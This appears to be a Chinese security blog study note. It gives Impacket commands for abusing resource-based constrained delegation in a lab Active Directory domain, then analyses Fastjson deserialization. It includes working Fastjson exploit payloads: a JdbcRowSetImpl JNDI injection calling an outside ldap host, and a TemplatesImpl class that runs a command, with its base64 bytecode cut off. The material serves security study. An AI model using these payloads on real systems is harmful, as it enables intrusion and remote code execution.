<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">addcomputer.py -dc-ip 192.168.1.250 -computer-name <span class="string">&#x27;ziyuanyueshu1$&#x27;</span> -computer-pass ziyuanyueshu1@123 y5neko.com/user1:win71@123</span><br><span class="line"><span class="comment">#2021版本</span></span><br><span class="line">rbcd.py -f ziyuanyueshu1 -t WIN71 -dc-ip 192.168.1.250 y5neko\\ziyuanyueshu:ziyuanyueshu\@123</span><br><span class="line"><span class="comment">#新版本</span></span><br><span class="line">rbcd.py -delegate-to WIN71$ -delegate-from ziyuanyueshu1$ -dc-ip 192.168.1.250 y5neko/ziyuanyueshu:ziyuanyueshu@123 -action write</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231011172259024.png" alt="image-20231011172259024" style="zoom:80%;" />

<img src="/image/image-20231011172438459.png" alt="image-20231011172438459" style="zoom:80%;" />

<img src="/image/image-20231011213936700.png" alt="image-20231011213936700" style="zoom: 67%;" />

<img src="/image/image-20231011220818453.png" alt="image-20231011220818453" style="zoom:80%;" />

<p>模拟域管理员administrator账号申请访问win7的ST，ptt，然后wmiexec到目标主机:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">getST.py -spn cifs/win71.y5neko.com -impersonate administrator -dc-ip 192.168.1.250 y5neko.com/ziyuanyueshu1$:ziyuanyueshu1@123</span><br><span class="line">wmiexec.py -dc-ip 192.168.1.250 -no-pass -k administrator@win71.y5neko.com</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231016170144548.png" alt="image-20231016170144548" style="zoom:80%;" />

<img src="/image/image-20231016172303620.png" alt="image-20231016172303620" style="zoom:80%;" />

<blockquote>
<p>我在第一次测试的时候wmiexec出现报错0x800706ba</p>
<img src="/image/image-20231016172836543.png" alt="image-20231016172836543" style="zoom:80%;" />

<p>后来查了一下发现是防火墙的报错，关闭即可</p>
<img src="/image/image-20231016173047897.png" alt="image-20231016173047897" style="zoom:80%;" />
</blockquote>
<h4 id="利用（提权）"><a href="#利用（提权）" class="headerlink" title="利用（提权）"></a>利用（提权）</h4><h1 id="常见漏洞利用"><a href="#常见漏洞利用" class="headerlink" title="常见漏洞利用"></a>常见漏洞利用</h1><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><h3 id="T3协议反序列化CVE-2015-4852"><a href="#T3协议反序列化CVE-2015-4852" class="headerlink" title="T3协议反序列化CVE-2015-4852"></a>T3协议反序列化CVE-2015-4852</h3><h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><h3 id="正常解析"><a href="#正常解析" class="headerlink" title="正常解析"></a>正常解析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;param1\&quot;:\&quot;test1\&quot;,\&quot;param2\&quot;:\&quot;test2\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">        System.out.println(jsonObject.getString(<span class="string">&quot;param1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231018160435725.png" alt="image-20231018160435725" style="zoom:80%;" />

<h3 id="指定解析类型为对象"><a href="#指定解析类型为对象" class="headerlink" title="指定解析类型为对象"></a>指定解析类型为对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//String s = &quot;&#123;\&quot;param1\&quot;:\&quot;test1\&quot;,\&quot;param2\&quot;:\&quot;test2\&quot;&#125;&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Y5neKO\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//JSONObject jsonObject = JSON.parseObject(s);</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(s2, Person.class);</span><br><span class="line">        <span class="comment">//System.out.println(jsonObject);</span></span><br><span class="line">        <span class="comment">//System.out.println(jsonObject.getString(&quot;param1&quot;));</span></span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231018161304671.png" alt="image-20231018161304671" style="zoom:80%;" />

<h3 id="根据字符串反序列化任意类"><a href="#根据字符串反序列化任意类" class="headerlink" title="根据字符串反序列化任意类"></a>根据字符串反序列化任意类</h3><ul>
<li>上面是通过操作对应类，从而在类中进行字符串JSON解析生成对象，那如果字符串中前面加了@type，我们可以发现，@type对应的键值是可以直接解析指定的类的，我们可以发现通过传入不同的字符，可以执行不同的代码，这里就相当危险了。</li>
<li>至于为什么要引入这个type，我们这里举一个不是很恰当的例子：</li>
<li>现在有材料的衣服，一种是布料，一种是速干料，但是两种衣服外表是一样的，在生产过程的标签中（序列化过程），如果不加衣服的材料，在出厂反序列化的过程就会分不清，这样的话就会产生歧义，而如果加上材料，就相当于加上了@type这样的话，我们就可以分清楚衣服的材料对应哪一个衣服，但是又因为@type客户端可控，速干料的衣服就可以被贴上布料的标签，然后以便宜的价格去买到。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;param1\&quot;:\&quot;test1\&quot;,\&quot;param2\&quot;:\&quot;test2\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        String s2 = &quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Y5neKO\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s);</span></span><br><span class="line"><span class="comment">//        Person person = JSON.parseObject(s2, Person.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject.getString(&quot;param1&quot;));</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;------------&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(person.getName());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.y5neko.sec.fastjson.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s3);</span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231018162326072.png" alt="image-20231018162326072" style="zoom:80%;" />

<p>可以看到通过解析字符串，最后对Person里面的类进行了解析实例化赋值调用操作，赋值要不就是反射赋值，要不就是set函数去改，我们可以发现这里是通过调用了Person里面的set函数去进行的赋值。</p>
<p>我们在parsePbject方法下个断点分析一下</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img src="/image/image-20231018163645182.png" alt="image-20231018163645182" style="zoom:80%;" />

<p>后面几行就是转一个JSONObject，我们直接跟进parse方法</p>
<img src="/image/image-20231018164553666.png" alt="image-20231018164553666" style="zoom:80%;" />

<p>这里调用了DefaultJSONParser类对传入字符串进行解析，一般情况下都是调用这个，接下来调用DefaultJSONParser对象中的parse方法</p>
<p>主要分为两个阶段，一个是对字符串形式的判断，是否为json形式，一个是对key和value的获取，先获取key的值，再获取value的值。</p>
<img src="/image/image-20231018181939302.png" alt="image-20231018181939302" style="zoom:80%;" />



<p>跟进到parse的第二个构造方法，这里是一段switch语句获取token来判断json格式，当开头为 { 时token为12，则进入到LBRACE分支</p>
<img src="/image/image-20231018182323639.png" alt="image-20231018182323639" style="zoom:80%;" />

<p>跟进到parseObject方法，在这里实现获取key的操作，这里我们获取到的是@type</p>
<img src="/image/image-20231018183701961.png" alt="image-20231018183701961" style="zoom:80%;" />

<p>而默认的DEFAULT_TYPE_KEY就是@type，就是获取key以后会做一个特殊的调整，表示应该做java反序列化还是单纯的json反序列化，这里匹配到@type，所以后续要Java反序列化</p>
<p>我们可以看到对类进行了<strong>loadClass</strong>加载，然后后面我们就要按照Java的逻辑来进行反序列化操作，这里第一步就是获取了反序列化器，然后用反序列化器进行反序列化操作</p>
<img src="/image/image-20231018184737838.png" alt="image-20231018184737838" style="zoom:80%;" />

<p>我们重点对反序列化过程进行分析，这里在创建反序列化器的时候需要先获取类里面的内容，跟进到config类</p>
<img src="/image/image-20231018192655141.png" alt="image-20231018192655141" style="zoom:80%;" />

<p>我们可以看到大概在这里有一个判断反序列化类内容的过程，如果不属于上面的几种类型，则通过JavaBean来解析类，继续跟进createJavaBeanDeserializer方法</p>
<img src="/image/image-20231018194119002.png" alt="image-20231018194119002" style="zoom:80%;" />

<p>首先检查asm是否启用，如果启用则进入asm过程</p>
<blockquote>
<p>ASM是一种高性能的JSON序列化和反序列化技术，它通过在运行时动态选择合适的方法来处理JSON数据，以提高性能。默认情况下，Fastjson会根据系统环境决定是否启用ASM。</p>
<p>如果<code>asmEnable</code>为<code>true</code>，则启用ASM，这可以在序列化和反序列化JSON时提供更好的性能。如果<code>asmEnable</code>为<code>false</code>，则禁用ASM，这将使用默认的序列化和反序列化方法。</p>
<p>请注意，<code>asmEnable</code>是Fastjson内部的一个设置，通常不需要用户手动配置。Fastjson会根据系统环境自动进行判断和设置。</p>
</blockquote>
<p>其中用于获取类内容是通过<code>JavaBeanInfo.build</code>函数，跟进到build函数</p>
<img src="/image/image-20231018200230560.png" alt="image-20231018200230560" style="zoom:80%;" />

<p>分析发现build函数的整个逻辑，先遍历了一遍method（set），然后遍历了一遍public fields，然后又遍历了一遍method（get）</p>
<p>满足set的条件如下</p>
<img src="/image/image-20231018202332820.png" alt="image-20231018202332820" style="zoom:80%;" />

<p>满足get的条件如下</p>
<img src="/image/image-20231018203154904.png" alt="image-20231018203154904" style="zoom:80%;" />

<p>最后再返回JavaBeanInfo对象</p>
<img src="/image/image-20231018201330344.png" alt="image-20231018201330344" style="zoom:80%;" />

<img src="/image/image-20231018201438438.png" alt="image-20231018201438438" style="zoom:80%;" />

<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>接下来我们分析一下fastjson的漏洞链</p>
<p>通过上面的分析我们知道，在反序列化时，parse触发了set方法，parseObject同时触发了set和get方法，由于存在这种<code>autoType</code>特性。如果<code>@type</code>标识的类中的setter或getter方法存在恶意代码，那么就有可能存在fastjson反序列化漏洞。</p>
<p>Fastjson 序列化对象的方法主要是<code>toJSONString</code> 方法，而反序列化还原对象的方法有3个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">parse(String text);</span><br><span class="line">parseObject(Srting text, Class\clazz);</span><br><span class="line">parseObject(String text);</span><br></pre></td></tr></table></figure>

<p>我们来看看三种方法返回的类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;param1\&quot;:\&quot;test1\&quot;,\&quot;param2\&quot;:\&quot;test2\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        String s2 = &quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Y5neKO\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s);</span></span><br><span class="line"><span class="comment">//        Person person = JSON.parseObject(s2, Person.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject.getString(&quot;param1&quot;));</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;------------&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(person.getName());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.y5neko.sec.fastjson.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object1</span> <span class="operator">=</span> JSON.parse(s3);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> JSON.parseObject(s3, Person.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object3</span> <span class="operator">=</span> JSON.parseObject(s3);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;object1:&quot;</span>);</span><br><span class="line">        System.out.println(object1);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;object2:&quot;</span>);</span><br><span class="line">        System.out.println(object2);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;object3:&quot;</span>);</span><br><span class="line">        System.out.println(object3);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231018205340468.png" alt="image-20231018205340468" style="zoom:80%;" />

<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a><strong>特点</strong></h4><ul>
<li><strong>FastJson不需要实现Serializable</strong></li>
<li><strong>不需要变量不是transient&#x2F;可控变量：</strong><ol>
<li>变量有对应的setter</li>
<li>或是public&#x2F;static</li>
<li>或满足条件的getter(返回值是)：</li>
</ol>
</li>
<li><strong>反序列化入口点不是readObject，而是setter或者是getter</strong></li>
<li><strong>执行点是相同的：反射或者类加载</strong></li>
</ul>
<h3 id="FastJson-1"><a href="#FastJson-1" class="headerlink" title="FastJson&lt;1.2.24"></a>FastJson&lt;1.2.24</h3><h4 id="JdbcRowSetImpl类-JNDI注入（出网）"><a href="#JdbcRowSetImpl类-JNDI注入（出网）" class="headerlink" title="JdbcRowSetImpl类+JNDI注入（出网）"></a><code>JdbcRowSetImpl</code>类+JNDI注入（出网）</h4><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>首先我们找到一个JNDI注入</p>
<img src="/image/image-20231018210100036.png" alt="image-20231018210100036" style="zoom: 80%;" />

<p>可以看到调用了getDataSourceName方法，因此我们看一下<code>getDataSourceName</code>下面的参数可不可控，可以看到存在setter方法，所以可控</p>
<img src="/image/image-20231018211706006.png" alt="image-20231018211706006" style="zoom:80%;" />

<p>我们就要找一下对应的setter或者是符合条件的getter方法能够调用connect的方法</p>
<img src="/image/image-20231018211948085.png" alt="image-20231018211948085" style="zoom:80%;" />

<p>一共找到了三处，其中get并不满足要求，所以我们选择set</p>
<img src="/image/image-20231018212337541.png" alt="image-20231018212337541" style="zoom:80%;" />

<img src="/image/image-20231018212357408.png" alt="image-20231018212357408" style="zoom:80%;" />

<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p>现在我们来构造exp，用yakit开一个dnslog</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://fastjson.eyutdtslkb.dgrh3.cn/rNMfFuPI\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object1</span> <span class="operator">=</span> JSON.parse(s3);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> JSON.parseObject(s3, Person.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object3</span> <span class="operator">=</span> JSON.parseObject(s3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231018215930992.png" alt="image-20231018215930992" style="zoom:80%;" />

<p>说明反序列化利用成功，直接起一个JNDI反连</p>
<img src="/image/image-20231018220554695.png" alt="image-20231018220554695" style="zoom:80%;" />

<h5 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h5><p>因为需要反连，所以要求出网</p>
<h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a><code>TemplatesImpl</code></h4><p>基于TemplatesImpl类的利用链，该类会把_bytecodes属性的字节码内容加载并实例化</p>
<blockquote>
<p>PS：需要开启parse的Feature.SupportNonPublicField参数</p>
</blockquote>
<h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>首先我们来分析一下<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
<p>我们需要找到一个存在漏洞的getter或者setter，我们找到了这个方法<code>getOutputProperties()</code>，在parseObject反序列化时会调用</p>
<p>getOutputProperties内部调用了newTransformer()方法，而newTransformer()内部调用了getTransletInstance()方法获取Translet对象</p>
<img src="/image/image-20231019144409104.png" alt="image-20231019144409104" style="zoom:80%;" />

<img src="/image/image-20231019144531978.png" alt="image-20231019144531978" style="zoom:80%;" />

<p>继续跟进内部，其中通过defineTransletClasses获取字节码来生成返回的Translet对象</p>
<img src="/image/image-20231019145036151.png" alt="image-20231019145036151" style="zoom:80%;" />

<p>而defineTransletClasses方法则通过内部的私有变量_bytecodes生成返回的Translet对象</p>
<img src="/image/image-20231019145501432.png" alt="image-20231019145501432" style="zoom:80%;" />

<p>这里这个_bytecodes私有变量就是整个攻击设计的核心所在，虽然FastJson默认只能反序列化公有属性，但是可以在JSON串中指定_bytecodes为我们恶意攻击类的字节码，同时调用<code>JSON.parseObject(json, Object.class, Feature.SupportNonPublicField)</code>来反序列化私有属性，那么_bytecodes就可以是任意指定代码</p>
<p>也就是说，如果事先定义好了Translet返回Class类的内容，并且在自定义的Translet类的构造函数中实现攻击代码，并且把攻击代码转化成字节码，传入TemplatesImpl的私有变量_bytecodes中，那么反序列化生成TemplatesImpl时就会使用我们自定义的字节码来生成Translet类，从而触发Translet构造函数中的攻击代码</p>
<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><p>首先构造一个恶意类，继承自AbstractTranslet类，因为时抽象类所以要实现其中的两个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM arg0, SerializationHandler[] arg1)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        <span class="comment">// anything</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        <span class="comment">// anything</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成class文件后读取字节码，再转成base64</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yv66vgAAADQASwoADQAqCQArACwIAC0KAC4ALwcAMAgAMQoAMgAzCgAyADQKADUANgcANwoACgA4BwA5BwA6AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC5MY29tL3k1bmVrby9zZWMvZmFzdGpzb24vVGVtcGxhdGVzSW1wbFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEYXJnMAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEABGFyZzEBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAEYXJnMgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAANjbWQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHADcBAApTb3VyY2VGaWxlAQAZVGVtcGxhdGVzSW1wbFBheWxvYWQuamF2YQwADgAPBwA8DAA9AD4BAAdTdWNjZXNzBwA/DABAAEEBABBqYXZhL2xhbmcvU3RyaW5nAQAEY2FsYwcAQgwAQwBEDABFAEYHAEcMAEgASQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAEoADwEALGNvbS95NW5la28vc2VjL2Zhc3Rqc29uL1RlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANlcnIBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAAd3YWl0Rm9yAQADKClJAQAPcHJpbnRTdGFja1RyYWNlACEADAANAAAAAAAEAAEADgAPAAEAEAAAAC8AAQABAAAABSq3AAGxAAAAAgARAAAABgABAA